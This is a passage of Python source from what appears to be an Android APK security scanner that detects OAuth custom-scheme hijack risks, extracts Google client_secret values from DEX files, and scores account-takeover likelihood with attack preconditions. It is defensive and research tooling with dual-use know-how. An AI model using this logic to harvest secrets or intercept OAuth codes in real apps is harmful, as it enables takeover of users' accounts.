    status = 'ok'          # 'ok' | 'timeout' | 'worker_error'
    t_start = _time.monotonic()
    try:
        try:
            result = q.get(timeout=timeout_seconds)
        except _queue.Empty:
            # Genuinely waited the full window with no result: hung/slow analysis.
            result = []
            status = 'timeout'
        except Exception:
            # Queue/pipe error or the worker died abnormally (crash, OOM-kill).
            # This is NOT a timeout and usually happens fast, so it must not be
            # reported as "exceeded N minutes" - that message was misleading.
            result = []
            status = 'worker_error'

        if status != 'ok':
            elapsed = _time.monotonic() - t_start
            # Do not wait further on a worker that missed its window; terminate
            # promptly so a hung decode costs at most ~timeout, not timeout+join.
            if p.is_alive():
                try:
                    p.terminate()
                except Exception:
                    pass
            p.join(5)
            try:
                if status == 'timeout':
                    print(f"{YELLOW}AES analysis exceeded {timeout_seconds // 60} min "
                          f"on '{apk_file}'. Skipping and continuing.{RESET}")
                else:
                    print(f"{YELLOW}AES analysis worker exited early after "
                          f"~{int(elapsed)}s (not a timeout) on '{apk_file}'. "
                          f"Skipping and continuing.{RESET}")
            except Exception:
                pass
            return []

        # Got a result in time: reap the worker.
        p.join(5)
        if p.is_alive():
            try:
                p.terminate()
                p.join(5)
            except Exception:
                pass
        return result if result is not None else []
    finally:
        # Always release the queue's pipe FDs / semaphore. Without this, one
        # Queue per APK across a large batch can exhaust file descriptors.
        try:
            q.close()
        except Exception:
            pass




# ============================================================
# OAuth scheme-hijack engine.
# Detection is always-on; PoC generation is gated behind -oauth-poc.
# ============================================================

OAUTH_PROVIDERS = [
    # Google: com.googleusercontent.apps.{PROJECT_NUMBER}-{HASH}
    {
        'name': 'google',
        'scheme_re': re.compile(r'com\.googleusercontent\.apps\.([a-zA-Z0-9._\-]+)'),
        'auth_endpoint': 'https://accounts.google.com/o/oauth2/v2/auth',
        'token_endpoint': 'https://oauth2.googleapis.com/token',
        'default_scopes': 'openid email profile',
        'supports_pkce': True,
        'client_secret_required': False,  # Android = public client
    },
    # Facebook: fb{APP_ID}
    {
        'name': 'facebook',
        'scheme_re': re.compile(r'^fb(\d{10,20})$'),
        'auth_endpoint': 'https://www.facebook.com/v18.0/dialog/oauth',
        'token_endpoint': 'https://graph.facebook.com/v18.0/oauth/access_token',
        'default_scopes': 'email public_profile',
        'supports_pkce': True,
        'client_secret_required': False,  # Mobile = public client
    },
    # Microsoft: msauth://{package_name}/{hash} or msal{client_id}
    {
        'name': 'microsoft',
        'scheme_re': re.compile(r'^msal([a-f0-9\-]{36})$'),
        'auth_endpoint': 'https://login.microsoftonline.com/common/oauth2/v2.0/authorize',
        'token_endpoint': 'https://login.microsoftonline.com/common/oauth2/v2.0/token',
        'default_scopes': 'openid email profile User.Read',
        'supports_pkce': True,
        'client_secret_required': False,
    },
    # GitHub: ghauth://{client_id} (less common on mobile)
    {
        'name': 'github',
        'scheme_re': re.compile(r'^ghauth([a-f0-9]{20})$'),
        'auth_endpoint': 'https://github.com/login/oauth/authorize',
        'token_endpoint': 'https://github.com/login/oauth/access_token',
        'default_scopes': 'read:user user:email',
        'supports_pkce': True,
        'client_secret_required': True,  # GitHub requires secret even for mobile
    },
]


_FIREBASE_SHARED_PROJECT_NUMBERS = frozenset({
    '764086051850',   # Firebase default (most common - seen in 50+ apps)
    '574395421659',   # Firebase Auth fallback
    '176963608412',   # Firebase legacy
    '680741426986',   # Firebase Emulator Suite
    '263850901160',   # Firebase test project
})


CONFIDENCE_CONFIRMED = 'CONFIRMED'


CONFIDENCE_HIGH = 'HIGH'


CONFIDENCE_MEDIUM = 'MEDIUM'


CONFIDENCE_LOW = 'LOW'


def extract_strings_from_manifest(manifest_bytes, min_len=6):
    """Extract printable strings from binary Android manifest."""
    result = set()
    # ASCII
    current = []
    for byte in manifest_bytes:
        if 32 <= byte < 127:
            current.append(chr(byte))
        else:
            if len(current) >= min_len:
                result.add(''.join(current))
            current = []
    if len(current) >= min_len:
        result.add(''.join(current))
    # UTF-16LE
    current = []
    i = 0
    while i < len(manifest_bytes) - 1:
        char = manifest_bytes[i] | (manifest_bytes[i + 1] << 8)
        if 32 <= char < 127:
            current.append(chr(char))
        else:
            if len(current) >= min_len:
                result.add(''.join(current))
            current = []
        i += 2
    if len(current) >= min_len:
        result.add(''.join(current))
    return result


def extract_package_from_axml(manifest_bytes):
    """
    Parse the 'package' attribute from the <manifest> tag in binary AXML.

    Android binary XML layout:
      File header:  magic(4) + filesize(4)
      String pool:  type=0x0001, contains all attribute names and values
      Resource map: type=0x0180
      XML nodes:    START_NAMESPACE(0x0100), START_ELEMENT(0x0102), etc.

    The <manifest> tag is always the first START_ELEMENT.  Its 'package'
    attribute value is the app's package name.  We parse just enough of
    the AXML to read that one attribute - no full tree walk needed.
    """
    import struct

    if len(manifest_bytes) < 16:
        return None

    # --- 1. Parse string pool ---
    # File header is 8 bytes, string pool starts right after.
    sp_off = 8
    if sp_off + 28 > len(manifest_bytes):
        return None

    sp_type, sp_hdr_size, sp_chunk_size = struct.unpack_from('<HHI', manifest_bytes, sp_off)
    if sp_type != 0x0001:
        return None

    str_count, _, flags, str_start, _ = struct.unpack_from('<IIIII', manifest_bytes, sp_off + 8)
    is_utf8 = bool(flags & 0x100)

    # Read string offsets
    offsets_base = sp_off + 28
    if offsets_base + str_count * 4 > len(manifest_bytes):
        return None
    str_offsets = [struct.unpack_from('<I', manifest_bytes, offsets_base + i * 4)[0]
                   for i in range(str_count)]

    # Decode strings from the pool
    data_base = sp_off + str_start
    strings = []
    for i in range(str_count):
        pos = data_base + str_offsets[i]
        try:
            if is_utf8:
                # UTF-8 encoding: varint char-len, varint byte-len, then bytes
                cl = manifest_bytes[pos]; pos += 1
                if cl & 0x80:
                    pos += 1  # skip high byte of char-len
                bl = manifest_bytes[pos]; pos += 1
                if bl & 0x80:
                    bl = ((bl & 0x7F) << 8) | manifest_bytes[pos]; pos += 1
                s = manifest_bytes[pos:pos + bl].decode('utf-8', errors='replace')
            else:
                # UTF-16LE encoding: uint16 char-count, then chars
                cc = struct.unpack_from('<H', manifest_bytes, pos)[0]; pos += 2
                if cc & 0x8000:
                    cc = ((cc & 0x7FFF) << 16) | struct.unpack_from('<H', manifest_bytes, pos)[0]
                    pos += 2
                s = manifest_bytes[pos:pos + cc * 2].decode('utf-16-le', errors='replace')
            strings.append(s)
        except Exception:
            strings.append('')

    # --- 2. Find the string index of "package" ---
    pkg_attr_idx = None
    for i, s in enumerate(strings):
        if s == 'package':
            pkg_attr_idx = i
            break
    if pkg_attr_idx is None:
        return None

    # --- 3. Scan chunks for the first START_ELEMENT (<manifest>) ---
    off = sp_off + sp_chunk_size
    while off + 8 <= len(manifest_bytes):
        c_type, c_hdr, c_size = struct.unpack_from('<HHI', manifest_bytes, off)
        if c_size < 8:
            break

        if c_type == 0x0102:  # XML_START_ELEMENT
            # Layout after the 8-byte chunk header:
            #   line(4) comment(4) ns(4) name(4)
            #   attrStart(2) attrSize(2) attrCount(2) idIdx(2) classIdx(2) styleIdx(2)
            if off + 36 > len(manifest_bytes):
                break
            name_idx = struct.unpack_from('<i', manifest_bytes, off + 20)[0]
            attr_count = struct.unpack_from('<H', manifest_bytes, off + 28)[0]

            # Verify this is <manifest>
            if 0 <= name_idx < len(strings) and strings[name_idx] == 'manifest':
                # Each attribute is 20 bytes starting at off+36
                for a in range(attr_count):
                    a_off = off + 36 + a * 20
                    if a_off + 20 > len(manifest_bytes):
                        break
                    a_name, a_raw = struct.unpack_from('<ii', manifest_bytes, a_off + 4)[:2]
                    if a_name == pkg_attr_idx:
                        # a_raw is the string-pool index of the value
                        if 0 <= a_raw < len(strings) and strings[a_raw]:
                            return strings[a_raw]
                        # fallback: try typed-value data field
                        tv_data = struct.unpack_from('<I', manifest_bytes, a_off + 16)[0]
                        if 0 <= tv_data < len(strings) and strings[tv_data]:
                            return strings[tv_data]
                return None  # <manifest> found but no package attr

            # First START_ELEMENT wasn't <manifest> - shouldn't happen, bail
            break

        off += c_size

    return None


def _dedup_generic_findings(findings):
    """
    Deduplicate generic_findings (HIGH/INFO/MEDIUM scheme findings).

    A single activity commonly has multiple <data> elements with the SAME scheme
    (one per path, e.g. /normal and /magiclink), and the manifest scan emits one
    finding per <data> element. Collapse to one finding per
    (type, scheme, activity) - keeping the entry with the most informative path.
    """
    best = {}
    order = []
    for f in findings:
        key = (f.get('type', ''), f.get('scheme', ''), f.get('activity', ''))
        if key not in best:
            best[key] = f
            order.append(key)
        else:
            # Prefer the entry that carries a redirect_path (more actionable),
            # and preserve any _prefix_risk flag seen on any duplicate.
            existing = best[key]
            if f.get('redirect_path') and not existing.get('redirect_path'):
                # keep prefix-risk if either had it
                f['_prefix_risk'] = f.get('_prefix_risk') or existing.get('_prefix_risk')
                best[key] = f
            elif f.get('_prefix_risk'):
                existing['_prefix_risk'] = True
    return [best[k] for k in order]


def _dedup_providers(providers):
    """
    Deduplicate found_providers list.

    Two passes:
      1. Exact dedup - same (provider, client_id) pair appearing multiple times
         due to the same string in classes.dex + classes2.dex + classes3.dex.
      2. Firebase shared client_id filter - project numbers registered to Google's
         own infrastructure; not exploitable as scheme hijack targets.
    """
    seen = set()
    deduped = []
    for p in providers:
        # Extract project number for Firebase check
        cid = p.get('client_id', '')
        project_number = cid.split('-')[0] if '-' in cid else ''

        # Firebase shared project - skip entirely
        if project_number in _FIREBASE_SHARED_PROJECT_NUMBERS:
            continue

        # Exact duplicate (provider + client_id) - keep first occurrence only
        key = (p.get('provider', ''), cid)
        if key in seen:
            continue
        seen.add(key)
        # Attach confidence tier + unverified preconditions
        tier, preconditions = _score_confidence(p)
        p['confidence'] = tier
        p['preconditions'] = preconditions
        deduped.append(p)
    return deduped


# --- Google OAuth client_secret detection (actuator.sh "The Wrong Dropdown") ---
# A Google OAuth client registered as a "Web application" type ships a
# client_secret; Google's token endpoint then REQUIRES that secret for the
# code->token exchange (public "Android" clients do not). This does not change
# whether tokens are reachable - both populations reach full ATO - it changes
# which exchange parameters Google's endpoint accepts. The reliable signal is
# the secret string in the DEX, not the provider identity. Detection is value
# backed and deliberately conservative to avoid the false positives a bare
# 24-char base64url sweep would produce.
_GOCSPX_RE = re.compile(rb'GOCSPX-[A-Za-z0-9_\-]{20,40}(?![A-Za-z0-9_\-])')
_GOOGLE_TOKEN_EP_RE = re.compile(
    rb'(?:oauth2\.googleapis\.com/token|accounts\.google\.com/o/oauth2/(?:v\d+/)?token)')
_CLIENT_SECRET_KEY_RE = re.compile(rb'client_secret')
# Exactly 24 base64url chars, delimited on both sides. Bounding prevents matching
# a 24-char prefix of a longer base64 blob (keys, certs, signatures), which the
# unbounded form would wrongly surface as a secret.
_B64URL_24_RE = re.compile(rb'(?<![A-Za-z0-9_\-])[A-Za-z0-9_\-]{24}(?![A-Za-z0-9_\-])')


def _redact_secret(value):
    """Redact a secret for report output - keep only a short identifying prefix."""
    if not value:
        return ''
    return value[:10] + '...REDACTED' if len(value) > 12 else value[:4] + '...'


def _credential_candidates(dex_bytes):
    """Delimited 24-char mixed-case base64url strings in one DEX, excluding
    client_id fragments. Returns [(offset, value)]. Layout-independent: matches
    anywhere in the DEX, not tied to proximity. Mixed case excludes lowercase hex
    digests and uppercase base32.
    """
    out = []
    for cm in _B64URL_24_RE.finditer(dex_bytes):
        cand = cm.group(0)
        if dex_bytes[cm.end():cm.end() + 27].startswith(b'.apps.googleuser'):
            continue  # client_id, not a secret
        head = cand.split(b'-')[0]
        if b'-' in cand and head.isdigit():
            continue  # client_id-style numeric prefix
        s = cand.decode('ascii', 'replace')
        if not (any(c.islower() for c in s) and any(c.isupper() for c in s)):
            continue  # require mixed case
        out.append((cm.start(), s))
    return out


def _detect_google_client_secret(apk_path):
    """Scan DEX bytes for evidence the APK ships a Google OAuth client_secret
    (the client was registered as a "Web application" type, not "Android").

    Returns (present: bool, value: str|None). 'value' is the recovered secret
    when it can be isolated (full value, for local PoC use); None when it cannot.
    Lightweight raw-byte approach (no disassembly). Three signals, strongest first:

      1. A GOCSPX- secret anywhere. Conclusive and layout-independent.
      2. A credential-shaped value within 512 bytes of a Google token endpoint
         (the blog's byte-adjacency condition). Low FP but layout-dependent.
      3. Layout-INDEPENDENT legacy signal: the app references the literal
         client_secret parameter AND Google's token endpoint (a manual code->token
         exchange) AND ships a credential-shaped value. This does not rely on
         string-pool adjacency, which DEX sorting routinely breaks, so it catches
         secrets that sit far from the endpoint string. Requiring an actual value
         (not just the client_secret key) keeps public-client OAuth boilerplate -
         which carries the key but no secret value - from matching.
    """
    try:
        gocspx_val = None
        key_present = False
        endpoint_present = False
        adjacent_val = None
        all_cands = []
        with zipfile.ZipFile(str(apk_path), 'r') as zf:
            for nm in zf.namelist():
                if not nm.endswith('.dex'):
                    continue
                b = zf.read(nm)
                if gocspx_val is None:
                    m = _GOCSPX_RE.search(b)
                    if m:
                        gocspx_val = m.group(0).decode('ascii', 'replace')
                        break  # GOCSPX- is conclusive
                if not key_present and _CLIENT_SECRET_KEY_RE.search(b):
                    key_present = True
                ep_offsets = [em.start() for em in _GOOGLE_TOKEN_EP_RE.finditer(b)]
                if ep_offsets:
                    endpoint_present = True
                cands = _credential_candidates(b)
                if adjacent_val is None:
                    for coff, cval in cands:
                        if any(abs(coff - eoff) <= 512 for eoff in ep_offsets):
                            adjacent_val = cval
                            break
                all_cands.extend(cval for _, cval in cands)
        if gocspx_val:
            return True, gocspx_val
        if adjacent_val:
            return True, adjacent_val
        # Layout-independent legacy signal. Digit-bearing values only, to further
        # separate real secrets from incidental mixed-case tokens.
        digit_cands = [c for c in all_cands if any(ch.isdigit() for ch in c)]
        if key_present and endpoint_present and digit_cands:
            return True, (digit_cands[0] if len(digit_cands) == 1 else None)
        return False, None
    except Exception:
        return False, None


def _classify_google_client_type(found_providers, apk_path):
    """Annotate the app's OWN Google providers with the observed client type
    (confidential "Web application" vs public "Android") from a DEX client_secret
    scan. Cross-platform (borrowed iOS/desktop) client_ids are left unclassified -
    a detected secret cannot be attributed to them. Mutates and returns the list.
    """
    if not any(p.get('provider') == 'google' and not p.get('_cross_platform')
               for p in found_providers):
        return found_providers
    present, val = _detect_google_client_secret(apk_path)
    for p in found_providers:
        if p.get('provider') != 'google' or p.get('_cross_platform'):
            continue
        p['client_secret_required'] = present
        p['client_secret_present'] = present
        p['client_type'] = ('confidential (Web application)' if present
                             else 'public (Android)')
        if val:
            p['client_secret_value'] = val
    return found_providers


def _score_confidence(provider):
    """
    Returns (confidence_tier, [unverified_preconditions]) for a provider finding.

    The tier reflects how much of the attack is statically provable.  The
    precondition list names exactly what the POC run must confirm - these are the
    residual false-positive sources that NO static analysis can eliminate.
    """
    preconditions = []
    is_cross = provider.get('_cross_platform', False)
    has_redirect = bool(provider.get('redirect_host'))
    needs_secret = provider.get('client_secret_required', False)

    # For a Google reverse-DNS custom-scheme client, the registered redirect_uri
    # is exactly "<scheme>:/" with no host or path, so scheme-only is the COMPLETE
    # redirect, not a partial recovery. (Contrast a borrowed cross-platform
    # iOS/desktop client_id, where a path may be registered and only scheme:/ was
    # recovered from DEX - that stays uncertain.) Only the app's own client.
    scheme = provider.get('scheme', '') or ''
    canonical_scheme_redirect = (
        provider.get('provider') == 'google'
        and scheme.startswith('com.googleusercontent.apps.')
        and not is_cross)
    redirect_known = has_redirect or canonical_scheme_redirect

    # --- Universal server-side unknowns (apply to every OAuth-redirect finding) ---
    preconditions.append('AS honors prompt=none for silent code issuance')
    preconditions.append('AS does not enforce Play Integrity / app attestation on /token')
    preconditions.append('Victim has a live SSO cookie in the shared browser jar')

    # --- Cross-platform adds the cross-client acceptance unknown ---
    if is_cross:
        preconditions.append(
            'AS accepts this client_id\'s redirect from an Android-originated request '
            '(no client-to-platform binding)')

    # --- Confidential (Web application) client: the code->token exchange
    #     requires a client_secret. Per "The Wrong Dropdown" that secret ships in
    #     the APK, so a recovered secret is NOT a blocker - the attacker holds it. ---
    secret_present = provider.get('client_secret_present', False)
    secret_blocks = needs_secret and not secret_present
    if needs_secret and secret_present:
        preconditions.append(
            'Confidential (Web application) client: the code->token exchange must '
            'include the client_secret shipped in the APK (recovered) - not a blocker')
    elif secret_blocks:
        preconditions.append(
            'Confidential client: token exchange requires a client_secret that was '
            'NOT recovered from the APK')

    # --- Recoverable redirect URI: required for the /token request to validate ---
    if is_cross and not has_redirect:
        preconditions.append(
            'Exact registered redirect_uri (scheme://host/path) - only scheme:/ was '
            'recovered from DEX; AS will reject if a path was registered')

    # --- Tier assignment ---
    if secret_blocks:
        # Confidential client whose secret was NOT recovered - attacker can
        # intercept the code but cannot redeem it.
        tier = CONFIDENCE_LOW
    elif is_cross and not has_redirect:
        # Cross-platform with no usable redirect URI - POC likely fails at /token.
        tier = CONFIDENCE_LOW
    elif is_cross:
        # Cross-platform with recoverable redirect - depends on cross-client acceptance.
        tier = CONFIDENCE_MEDIUM
    elif redirect_known:
        # Manifest-registered scheme with a complete redirect (recovered host, or
        # a Google reverse-DNS scheme whose canonical redirect is scheme:/).
        # Everything client-side is proven; only the universal server unknowns remain.
        tier = CONFIDENCE_HIGH
    else:
        tier = CONFIDENCE_MEDIUM

    return tier, preconditions


def extract_oauth_providers(manifest_bytes):
    """
    Two-tier detection:
    
    Tier 1 (CRITICAL): Provider-specific Client ID extracted from scheme
           e.g. com.googleusercontent.apps.CLIENT_ID -> active flow defeats PKCE
    
    Tier 2 (HIGH): AppAuth/OAuth indicators + any custom scheme found
           e.g. exampleappauth://, com.example.app.client://
           Passive interception of the app's own redirect scheme
    
    Returns: (providers_list, generic_findings_list, app_schemes_set)
    """
    strings = extract_strings_from_manifest(manifest_bytes, min_len=4)
    all_text_lower = ' '.join(strings).lower()

    found_providers = []   # Tier 1: provider + client_id
    generic_findings = []  # Tier 2: appauth + custom scheme
    app_schemes = set()

    # ================================================================
    # TIER 1: Provider-specific Client ID extraction
    # ================================================================
    for s in strings:
        s_clean = re.sub(r'^[^a-zA-Z]+', '', s)
        for provider in OAUTH_PROVIDERS:
            match = provider['scheme_re'].search(s_clean)
            if match:
                client_id = match.group(1)
                scheme_value = match.group(0)
                found_providers.append({
                    'provider': provider['name'],
                    'client_id': client_id,
                    'scheme': scheme_value,
                    'auth_endpoint': provider['auth_endpoint'],
                    'token_endpoint': provider['token_endpoint'],
                    'default_scopes': provider['default_scopes'],
                    'supports_pkce': provider['supports_pkce'],
                    'client_secret_required': provider['client_secret_required'],
                })

    # ================================================================
    # TIER 2: General AppAuth/OAuth detection
    # ================================================================

    # Step A: Check for OAuth redirect indicators
    OAUTH_PATTERNS = [
        'redirecturireceiveractivit',  # AppAuth core indicator
        'appauth',
        'oauth-callback', 'oauth_callback', 'oauthcallback',
        'auth-callback', 'signin-callback', 'login-callback',
        'sso-callback', 'social-redirect',
    ]
    oauth_hits = [p for p in OAUTH_PATTERNS if p in all_text_lower]
    has_appauth = any(x in all_text_lower for x in ['appauth', 'redirecturireceiveractivit'])

    if not oauth_hits:
        # No OAuth indicators at all -> return whatever tier 1 found
        return found_providers, generic_findings, app_schemes

    # Step B: Extract custom schemes with strict false-positive filtering
    #
    # Known FP sources from 170-APK scan:
    #   - <queries> blocks: apps list 100+ packages for visibility (VPN/root/emu detection)
    #   - SDK packages: com.microsoft.*, com.azure.*, com.crashlytics.*, com.taboola.*
    #   - Social SDK refs: com.zhiliaoapp.musically (TikTok), com.twitter.android
    # Fix: exclude known third-party prefixes, require package affinity, cap scheme count

    callback_schemes = set()   # scheme://callback pattern (strongest)
    all_schemes = set()        # any scheme:// pattern (filtered)
    meta_scheme_keys = set()   # APP_AUTH_REDIRECT_SCHEME etc.
    standalone_schemes = set() # single-word app-specific schemes (e.g. "exampleappauth")

    noise_words = {
        'scheme', 'string', 'android', 'layout', 'intent', 'action',
        'category', 'provider', 'service', 'activity', 'receiver',
        'permission', 'manifest', 'application', 'filter', 'exported',
        'enabled', 'label', 'theme', 'value', 'resource', 'drawable',
        'firebase', 'google', 'facebook', 'crashlytics', 'analytics',
        'datadog', 'branch', 'appsflyer', 'adjust', 'xmlns', 'default',
        'browsable', 'launcher', 'version', 'package', 'backup', 'meta',
        'data', 'queries', 'supports', 'screens', 'uses', 'true', 'false',
        # SDK placeholder / internal redirect schemes - not the app's own OAuth flow
        'genericidp', 'identityprovider', 'genericprovider', 'idpredirect',
        'authprovider', 'oauthprovider',
        # Third-party SDK schemes
        'lineauth', 'msauth', 'amzn', 'spaysdk', 'musicsdk',
        'juspayexternalapp', 'okauth', 'signinwithapple',
    }

    # Packages that appear in manifests but are NOT the app's own OAuth schemes.
    # Built from real scan false positives: VPN/root-detection package lists,
    # Microsoft MSAL, and third-party social/ad SDK redirect schemes.
    EXCLUDED_PKG_PREFIXES = (
        # Platforms & social SDKs
        'com.google.', 'com.android.', 'com.facebook.', 'com.instagram.',
        'com.twitter.', 'com.whatsapp.', 'com.tencent.', 'com.snapchat.',
        'com.zhiliaoapp.', 'com.ss.android.', 'com.linkedin.',
        # Microsoft / Azure
        'com.microsoft.', 'com.azure.',
        # Ad / analytics
        'com.taboola.', 'com.mopub.', 'com.applovin.', 'com.unity3d.',
        'com.ironsource.', 'com.vungle.', 'com.chartboost.',
        'com.pubmatic.', 'com.smaato.', 'com.inmobi.',
        # Firebase / Crashlytics
        'com.crashlytics.', 'com.firebase.',
        # Cloud / infra
        'com.amazon.', 'com.amazonaws.',
        # Device OEMs
        'com.samsung.', 'com.huawei.', 'com.xiaomi.', 'com.oppo.',
        'com.vivo.', 'com.oneplus.', 'com.motorola.', 'com.sec.',
        'com.sony.', 'com.lge.',
        # Root / superuser tools (<queries> pollution)
        'com.topjohnwu.', 'com.koushikdutta.', 'com.yellowes.',
        'com.devadvance.', 'com.amphoras.', 'com.formyhm.',
        'com.zachspong.', 'com.thirdparty.', 'com.saurik.',
        'com.ramdroid.', 'com.smedialink.', 'com.kingroot.',
        'com.kingo.', 'com.alephzain.', 'com.chelpus.',
        'com.dimonvideo.', 'com.noshufou.', 'com.repodroid.',
        # Emulators (<queries> pollution)
        'com.bluestacks.', 'com.bignox.', 'com.microvirt.',
        'com.genymotion.', 'com.andy.', 'com.smartgaga.',
        'com.koplayer.', 'com.lexa.',
        # VPN apps (<queries> pollution - biggest FP source)
        'com.vpn.', 'com.vpnmaster', 'com.freevpn.', 'com.supervpn.',
        'com.expressvpn.', 'com.nordvpn.', 'com.windscribe.',
        'com.hidemyass.', 'com.ixolit.', 'com.bitdefender.',
        'com.browsec.', 'com.psiphon', 'com.hotspotshield.',
        'com.kuto.', 'com.securevpn.', 'com.sharevpn.',
        'com.botchanger.', 'com.vpnbeaver.', 'com.vpnredcat.',
        'com.vpntomat.', 'com.vpnper.', 'com.northghost.',
        'com.proxymaster.', 'com.unblockproxymaster.',
        'com.microvpn.', 'com.westace.', 'com.appoxide.',
        'com.performarkt.', 'com.at0mx.', 'com.oneonone.',
        'com.shooravpn.', 'com.rygstudio.', 'com.smartcode.',
        'com.xvpn.', 'com.xvvpn.', 'com.xstudios.',
        'com.color.colorvpn', 'com.peach.vpn', 'com.drago.vpn',
        'com.ace.freevpn', 'com.mate.vpn', 'com.minidev.vpn',
        'com.speedy.vpn', 'com.dyer.sec', 'com.photon.vpn',
        'com.eagleheart.', 'com.prithvi.', 'com.xiaoming.',
        'com.unicorn.bravo', 'com.supermaster.', 'com.monstervpn.',
        'com.upnetvpn.', 'com.ufovpn.', 'com.bgpworks.',
        'com.nocardteam.', 'com.galaxylab.', 'com.ironmeta.',
        'com.gaston.', 'com.chengcheng.', 'com.charles.',
        'com.jrzheng.', 'com.universe.nb', 'com.fvcorp.',
        'com.allinone.', 'com.baseappfull.', 'com.appatomic.',
        'com.master.', 'com.VPN.',
        'com.pandavpnfree.', 'com.vpnoneclick.',
        # Social platforms (SDK refs, not the app's own scheme)
        'com.soundcloud.', 'com.vkontakte.', 'com.pinterest.',
        'com.tumblr.', 'com.reddit.', 'com.spotify.',
        # Common app SDKs that leak into manifests
        'com.zoho.', 'com.dropbox.', 'com.adobe.', 'com.viber.',
        'com.skype.', 'com.ebay.', 'com.loom.', 'com.chrome.',
        'com.opera.', 'com.brave.', 'com.ludo.', 'com.rocks.',
        'com.dv.adm', 'com.dd.', 'com.jiobit.', 'com.bolt.',
        'com.zipoapps.', 'com.ticktalk.', 'com.uptodown.',
        'com.mmi.', 'com.ibk.', 'com.knb.', 'com.aa.ad',
        # Payment SDKs
        'com.paypal.', 'com.stripe.', 'com.braintree.',
        # Monitoring / security
        'com.logmein.', 'com.mayi.', 'com.symantec.',
    )

    # Keywords that indicate <queries> block pollution, not OAuth schemes.
    # Catches VPN/root/emulator packages regardless of specific prefix.
    EXCLUDED_KEYWORDS = (
        'vpn', 'proxy', 'superuser', 'rootcloak', 'luckypatch',
        'emulator', 'fakegps', 'hidemyroot', 'hideroot',
    )

    def _is_excluded(pkg_lower):
        if any(pkg_lower.startswith(p) for p in EXCLUDED_PKG_PREFIXES):
            return True
        if any(kw in pkg_lower for kw in EXCLUDED_KEYWORDS):
            return True
        return False

    provider_scheme_set = {p['scheme'] for p in found_providers}

    for s in strings:
        s_lower = s.lower()
        s_clean = re.sub(r'^[^a-zA-Z]+', '', s)
        s_clean_lower = s_clean.lower()

        # Direct scheme://callback pattern (strongest signal)
        if '://' in s and any(kw in s_lower for kw in
                ['oauth', 'callback', 'redirect', 'auth', 'login', 'sso']):
            scheme = s.split('://')[0]
            scheme = re.sub(r'^[^a-zA-Z]+', '', scheme)
            if (scheme and len(scheme) > 2 and
                    not scheme.startswith('@') and
                    scheme.lower() not in ('https', 'http') and
                    scheme.lower() not in noise_words and
                    not _is_excluded(scheme.lower()) and
                    re.match(r'^[a-zA-Z][a-zA-Z0-9+.\-]*$', scheme)):
                callback_schemes.add(scheme)

        # General scheme:// pattern (filtered)
        if '://' in s:
            scheme = s.split('://')[0]
            scheme = re.sub(r'^[^a-zA-Z]+', '', scheme)
            if (scheme and len(scheme) > 2 and
                    not scheme.startswith('@') and
                    scheme.lower() not in ('https', 'http') and
                    scheme.lower() not in noise_words and
                    not _is_excluded(scheme.lower()) and
                    re.match(r'^[a-zA-Z][a-zA-Z0-9+.\-]*$', scheme)):
                all_schemes.add(scheme)

        # Meta-data keys referencing redirect schemes
        if any(kw in s.upper() for kw in
                ['REDIRECT_SCHEME', 'AUTH_SCHEME', 'OAUTH_SCHEME', 'CALLBACK_SCHEME']):
            meta_scheme_keys.add(s)

        # Package-style strings (com.x.y) - FILTERED
        # Require exactly 3 dotted components (e.g. com.example.app) to reduce
        # SDK/deep-dep strings like com.google.android.gms.auth.api being pulled in.
        if s_lower.startswith(('com.', 'app.', 'io.')):
            if (not s.endswith('.') and len(s) > 8 and '/' not in s and
                    ' ' not in s and
                    not _is_excluded(s_lower) and
                    re.match(r'^[a-zA-Z][a-zA-Z0-9.]*$', s) and
                    s.count('.') == 2):  # exactly 3 components; deeper paths are SDK refs
                all_schemes.add(s)

        # Standalone scheme-like strings (single word, 8-40 chars)
        if (s_clean_lower and
                8 <= len(s_clean) <= 40 and
                '.' not in s_clean and '/' not in s_clean and
                ' ' not in s_clean and ':' not in s_clean and
                '_' not in s_clean and
                s_clean_lower not in noise_words and
                re.match(r'^[a-z][a-z0-9]+$', s_clean_lower) and
                not s_clean_lower.startswith('android') and
                not s_clean_lower.startswith('google') and
                not s_clean_lower.startswith('firebase') and
                not s_clean_lower.startswith('facebook') and
                not s_clean_lower.startswith('androidx')):
            standalone_schemes.add(s_clean)

    # Step C: Resolve OAuth schemes with strict priority
    # 1. callback_schemes (://callback) = highest confidence
    # 2. meta_scheme_keys + standalone match = high confidence
    # 3. fallback to package-affinity scoring = capped
    oauth_schemes = set(callback_schemes)

    # If AppAuth but no callback schemes, try meta-data + package collapse
    if has_appauth and not oauth_schemes and meta_scheme_keys:
        pkg_candidates = set()
        for scheme in all_schemes:
            if scheme.startswith('com.') and scheme.count('.') >= 2:
                parts = scheme.split('.')
                collapsed = ''.join(parts[1:]).lower()
                pkg_candidates.add(collapsed)
                if len(parts) >= 3:
                    pkg_candidates.add(''.join(parts[-2:]).lower())

        for ss in standalone_schemes:
            if ss.lower() in pkg_candidates:
                oauth_schemes.add(ss)

        if not oauth_schemes:
            for ss in standalone_schemes:
                sl = ss.lower()
                for scheme in all_schemes:
                    if scheme.startswith('com.'):
                        parts = scheme.split('.')
                        matches = sum(1 for p in parts[1:] if p.lower() in sl)
                        if matches >= 2:
                            oauth_schemes.add(ss)

    # Fallback: use package-affinity scoring ONLY if the actual AppAuth
    # RedirectUriReceiverActivity is present. The generic string "appauth"
    # alone (from library names/deps) is too weak for the fallback path.
    # Requiring the activity avoids false positives from apps that merely ship
    # the AppAuth library string without an exported redirect receiver.
    has_redirect_activity = 'redirecturireceiveractivit' in all_text_lower
    if has_redirect_activity and not oauth_schemes:
        # Score each candidate by how unique its org prefix is
        # App's own package is usually unique; SDK strings repeat
        candidates = []
        for scheme in all_schemes:
            sl = scheme.lower()
            if sl.startswith('com.') and scheme.count('.') == 2:
                org = sl.split('.')[1] if len(sl.split('.')) >= 2 else ''
                org_count = sum(1 for s2 in all_schemes
                               if s2.lower().startswith('com.' + org + '.'))
                candidates.append((scheme, org_count))

        candidates.sort(key=lambda x: x[1])
        for scheme, count in candidates[:2]:
            if count <= 3:
                oauth_schemes.add(scheme)

    # SANITY CAP: legit apps have 1-3 redirect schemes max
    if len(oauth_schemes) > 5:
        if callback_schemes:
            oauth_schemes = set(callback_schemes)
        else:
            oauth_schemes = set()

    # Step D: Build app_schemes (non-provider custom schemes)
    for scheme in oauth_schemes:
        if scheme not in provider_scheme_set:
            app_schemes.add(scheme)

    # Step E: Build generic findings for schemes NOT already covered by tier 1
    for scheme in oauth_schemes:
        if scheme.lower() not in ('https', 'http'):
            # Skip if already covered by a provider detection (exact scheme match,
